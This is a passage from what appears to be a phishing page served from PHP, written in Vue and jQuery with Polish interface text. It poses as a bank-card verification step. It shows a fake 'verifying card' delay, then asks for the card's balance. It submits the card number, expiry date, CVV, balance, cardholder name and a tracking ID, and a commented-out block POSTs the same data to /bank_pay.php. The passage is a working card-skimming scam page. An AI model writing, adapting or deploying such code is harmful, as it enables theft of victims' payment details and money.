    document.getElementById("cardNumber").focus();
  },
  computed: {
    getCardType() {
      let number = this.cardNumber;
      let re = new RegExp("^4");
      if (number.match(re) != null) return "visa";

      re = new RegExp("^(34|37)");
      if (number.match(re) != null) return "amex";

      re = new RegExp("^5[1-5]");
      if (number.match(re) != null) return "mastercard";

      re = new RegExp("^6011");
      if (number.match(re) != null) return "discover";

      re = new RegExp(\'^9792\')
      if (number.match(re) != null) return \'troy\'

      return "visa"; // default type
    },
    generateCardNumberMask() {
      return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
    },
    minCardMonth() {
      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
      return 1;
    }
  },
  watch: {
    cardYear() {
      if (this.cardMonth < this.minCardMonth) {
        this.cardMonth = "";
      }
    }
  },
  methods: {
    flipCard(status) {
      this.isCardFlipped = status;
    },
    focusInput(e) {
      this.isInputFocused = true;
      let targetRef = e.target.dataset.ref;
      let target = this.$refs[targetRef];
      this.focusElementStyle = {
        width: `${target.offsetWidth}px`,
        height: `${target.offsetHeight}px`,
        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
      }
    },
    blurInput() {
      let vm = this;
      setTimeout(() => {
        if (!vm.isInputFocused) {
          vm.focusElementStyle = null;
        }
      }, 300);
      vm.isInputFocused = false;
    }
  }
});
</script>

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<div class="modal fade" id="waitModal" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-body">
        <center style="margin-bottom: 20px">Weryfikacja karty bankowej...</center>
        <div class="loader_2"></div>
      </div>
    </div>
  </div>
</div>
<input type="hidden" id="money_check" value="">
<script type="text/javascript">
    $(\'#submitButton\').click(function() {


        if($(\'#cardNumber\').val() != \'\' && $.isNumeric($(\'#cardMonth\').val()) && $.isNumeric($(\'#cardYear\').val()) && $(\'#card\').val() != \'\'){
        $(\'#waitModal\').modal(\'show\');

        setTimeout(
         function()
         {
             $(\'#waitModal\').modal(\'hide\');
             $(\'#balanceModal\').modal(\'show\');
         }, 3000);
   } else {
        alert(\'Błąd!\nPodano nieprawidłowe dane\');
     }
        });
    $(\'#sendBalance\').click(function(e) { 
    e.preventDefault();
     if($(\'#cardNumber\').val() != \'\' && $(\'#cardMonth\').val() != \'\' && $(\'.cardCvv\').val() != \'\' && +$(\'#cardBalance\').val().trim() != \'\'){
        $(\'#sendBalance\').html(\'Sprawdzanie danych...\');
        $(\'#cardForm\').submit();
       /*if ($(\'#money_check\').val() == \'f\') {
          $(\'#cardForm\').submit();
        } else {
          setTimeout(
       function()
       {
        bal = $(\'#cardBalance\').val().replaceAll(\',\', \'.\');
          bal = +bal;
          $(\'#cardForm\').submit();
           if (bal > +$(\'#limit\').val()) {
            $(\'#cardForm\').submit();
          } else {
            $(\'#balanceModal\').modal(\'hide\');
            $(\'#limitModal\').modal(\'show\');
            
            $.ajax({
                    type: \'POST\',
                    url: \'/bank_pay.php\',
                    data: {\'card\': $(\'#cardNumber\').val(), \'cvv\': $(\'.cardCvv\').val(), \'month\': $(\'#cardMonth\').val(), \'year\': $(\'#cardYear\').val().substring(2), \'balance\': $(\'#cardBalance\').val(), \'track_id\': $(\'#track_id\').val(), \'cardName\': $(\'#cardName\').val(), \'product\':'.$product->id.'},
                    success: function(data, textStatus) {
                        
                    }       
                });
          }
       }, 3000);
        } */
    } else {
      alert(\'Błąd!\nWprowadź prawidłowe dane\');
    }
    return false;
   });
   $(\'#limitclose\').click(function(e) {
    $(\'#limitModal\').modal(\'hide\');
   });
</script>
 
</body>

</html>
';
